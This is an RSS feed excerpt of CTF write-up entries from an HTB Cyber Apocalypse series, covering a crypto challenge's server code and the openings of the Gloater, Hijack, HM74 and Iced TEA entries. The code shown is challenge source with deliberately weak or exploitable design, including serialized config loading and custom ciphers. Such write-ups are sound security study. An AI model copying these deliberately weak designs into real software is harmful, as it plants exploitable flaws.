&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>&lt;span class="mtk4">'x'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]), &lt;/span>&lt;span class="mtk4">'y'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">A&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">])}))&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">while&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">True&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'1'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">bit_length&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">bit_length&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'p'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'a'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'b'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'2'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sha256&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">ec&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">))).&lt;/span>&lt;span class="mtk8">digest&lt;/span>&lt;span class="mtk1">()[:&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">]&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">new&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">MODE_CBC&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">flag&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">json&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">dumps&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'iv'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">(),&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'enc'&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">flag&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> }))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Bye.'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">exit&lt;/span>&lt;span class="mtk1">()&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>This time, there is no such option to request random points in the curve. We are just provided with a single random point at the beginning:&lt;/p></description></item><item><title>Gloater</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>gloater&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-yellow">Partial RELRO&lt;/span>
Stack: &lt;span class="code-dark-green">Canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
RUNPATH: &lt;span class="code-dark-red">b'./glibc/'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We are also given a &lt;code>Dockerfile&lt;/code> with the container configuration:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">FROM&lt;/span>&lt;span class="mtk1"> ubuntu:20.04&lt;/span>
&lt;span class="mtk5">ENV&lt;/span>&lt;span class="mtk1"> DEBIAN_FRONTEND noninteractive&lt;/span>

&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> apt-get update --fix-missing &amp;amp;&amp;amp; apt-get -y upgrad&lt;/span>&lt;span class="mtk1">e&lt;/span> 
&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> apt-get install -y socat&lt;/span>

&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> useradd -m ctf&lt;/span>

&lt;span class="mtk5">COPY&lt;/span>&lt;span class="mtk1"> challenge/* /home/ctf/&lt;/span>

&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> chown -R ctf:ctf /home/ctf/&lt;/span>

&lt;span class="mtk5">WORKDIR&lt;/span>&lt;span class="mtk1"> /home/ctf&lt;/span>
&lt;span class="mtk3">#USER ctf&lt;/span>

&lt;span class="mtk5">EXPOSE&lt;/span>&lt;span class="mtk1"> 9001&lt;/span>
&lt;span class="mtk5">CMD&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk4">"./run.sh"&lt;/span>&lt;span class="mtk1">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We can see that the program is running on Ubuntu 20.04, so it will use Glibc 2.31. We can launch the container and take &lt;code>libc.so.6&lt;/code> from inside:&lt;/p></description></item><item><title>Hijack</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hijack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hijack/</guid><description>&lt;p>We are given a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 167.71.143.44 31614 

&lt;span class="code-green">&amp;lt;------[TCS]------&amp;gt;&lt;/span>
&lt;span class="code-white">[1] Create config&lt;/span>
&lt;span class="code-white">[2] Load config&lt;/span>
&lt;span class="code-white">[3] Exit&lt;/span>
&lt;span class="code-white">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="basic-reconnaissance">Basic reconnaissance&lt;/h2>
&lt;p>We have two options. Using the first one, we can set some configuration and the output is a Base64-encoded string:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 165.232.100.46 31251

&lt;span class="code-green">&amp;lt;------[TCS]------&amp;gt;&lt;/span>
&lt;span class="code-white">[1] Create config&lt;/span>
&lt;span class="code-white">[2] Load config&lt;/span>
&lt;span class="code-white">[3] Exit&lt;/span>
&lt;span class="code-white">&amp;gt; 1&lt;/span>

&lt;span class="code-green">- Creating new config -&lt;/span>
&lt;span class="code-white">Temperature units (F/C/K): C&lt;/span>
&lt;span class="code-white">Propulsion Components Target Temperature : 13&lt;/span>
&lt;span class="code-white">Solar Array Target Temperature : 37&lt;/span>
&lt;span class="code-white">Infrared Spectrometers Target Temperature : 0&lt;/span>
&lt;span class="code-white">Auto Calibration (ON/OFF) : ON&lt;/span>

&lt;span class="code-white">Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcwJywgYXV0b19jYWxpYnJhdGlvbjogJ09OJywKICBwcm9wdWxzaW9uX3RlbXA6ICcxMycsIHNvbGFyX2FycmF5X3RlbXA6ICczNycsIHVuaXRzOiBDfQo=&lt;/span> 
&lt;span class="code-green">Uploading to ship...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>If we decode this string, we will see that it is a serialized object:&lt;/p></description></item><item><title>HM74</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hm74/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/hm74/</guid><description>&lt;p>We are given this Verilog hardware description code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">module&lt;/span> &lt;span class="mtk8">encoder&lt;/span>(
&lt;span class="mtk8"> input&lt;/span> [&lt;span class="mtk6">3&lt;span class="mtk5">:&lt;/span>0&lt;/span>] data_in,
&lt;span class="mtk8"> output&lt;/span> [&lt;span class="mtk6">6&lt;span class="mtk5">:&lt;/span>0&lt;/span>] ham_out
);

 &lt;span class="mtk7">wire&lt;/span> p0, p1, p2;

 &lt;span class="mtk5">assign&lt;/span> p0 &lt;span class="mtk5">=&lt;/span> data_in[&lt;span class="mtk6">3&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">2&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">0&lt;/span>];
 &lt;span class="mtk5">assign&lt;/span> p1 &lt;span class="mtk5">=&lt;/span> data_in[&lt;span class="mtk6">3&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">1&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">0&lt;/span>];
 &lt;span class="mtk5">assign&lt;/span> p2 &lt;span class="mtk5">=&lt;/span> data_in[&lt;span class="mtk6">2&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">1&lt;/span>] &lt;span class="mtk5">^&lt;/span> data_in[&lt;span class="mtk6">0&lt;/span>];

 &lt;span class="mtk5">assign&lt;/span> ham_out &lt;span class="mtk5">=&lt;/span> &lt;span class="mtk5">{&lt;/span> p0, p1, data_in[&lt;span class="mtk6">3&lt;/span>], p2, data_in[&lt;span class="mtk6">2&lt;/span>], data_in[&lt;span class="mtk6">1&lt;/span>], data_in[&lt;span class="mtk6">0&lt;/span>] &lt;span class="mtk5">}&lt;/span>; 
&lt;span class="mtk5">endmodule&lt;/span>

&lt;span class="mtk5">module&lt;/span> &lt;span class="mtk8">main&lt;/span>;
 &lt;span class="mtk7">wire&lt;/span>[&lt;span class="mtk6">3&lt;span class="mtk5">:&lt;/span>0&lt;/span>] data_in &lt;span class="mtk5">=&lt;/span> &lt;span class="mtk6">5&lt;/span>;
 &lt;span class="mtk7">wire&lt;/span>[&lt;span class="mtk6">6&lt;span class="mtk5">:&lt;/span>0&lt;/span>] ham_out;

 &lt;span class="mtk7">encoder&lt;/span> &lt;span class="mtk8">en&lt;/span>(data_in, ham_out);

 &lt;span class="mtk5">initial&lt;/span> &lt;span class="mtk5">begin&lt;/span>
 &lt;span class="mtk5">#&lt;/span>&lt;span class="mtk6">10&lt;/span>;
 &lt;span class="mtk7">$display&lt;/span>(&lt;span class="mtk4">"&lt;span class="mtk6">%b&lt;/span>"&lt;/span>, ham_out);
 &lt;span class="mtk5">end&lt;/span>
&lt;span class="mtk5">endmodule&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We also have an online instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 165.232.100.46 31734
Captured
Captured
Captured
Captured
Captured
Captured
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Plus, this is the description of the challenge:&lt;/p></description></item><item><title>Iced TEA</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/iced-tea/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/iced-tea/</guid><description>&lt;p>We are given the Python source code that encrypts the flag:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Padding&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">b2l&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">l2b&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">enum&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Enum&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Mode&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">Enum&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ECB&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">0x&lt;/span>&lt;span class="mtk6">01&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">CBC&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">0x&lt;/span>&lt;span class="mtk6">02&lt;/span>

&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">iv&lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk6">None&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">64&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">KEY&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk8">b2l&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">key&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1">:&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">]) &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">key&lt;/span>&lt;span class="mtk1">), &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)]&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">DELTA&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">0x&lt;/span>&lt;span class="mtk6">9e3779b9&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">IV&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">iv&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">IV&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mode&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Mode&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">CBC&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mode&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Mode&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">ECB&lt;/span>
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">_xor&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">''&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">join&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">([&lt;/span>&lt;span class="mtk1">_a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_b&lt;/span>&lt;span class="mtk1">]) &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">_b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">zip&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">))&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
